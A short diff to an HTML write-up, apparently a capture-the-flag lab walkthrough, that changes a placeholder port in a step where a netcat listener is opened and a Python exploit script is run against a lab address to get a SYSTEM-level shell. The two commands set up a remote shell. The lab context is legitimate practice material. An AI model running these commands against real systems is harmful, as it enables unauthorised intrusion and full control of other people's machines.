@@ -122,7 +122,7 @@ You can get more info about it here:
 
 <p>And now if we prepare a listener with <strong>Netcat</strong> and execute the python script we are in! Also we are authority\system already! 😄</p>
 
-<pre>nc -lnvp <PORTOFYOURCHOICE></pre>
+<pre>nc -lnvp 1234</pre>
 
 <pre>python2 42315.py 10.10.10.40</pre>
 
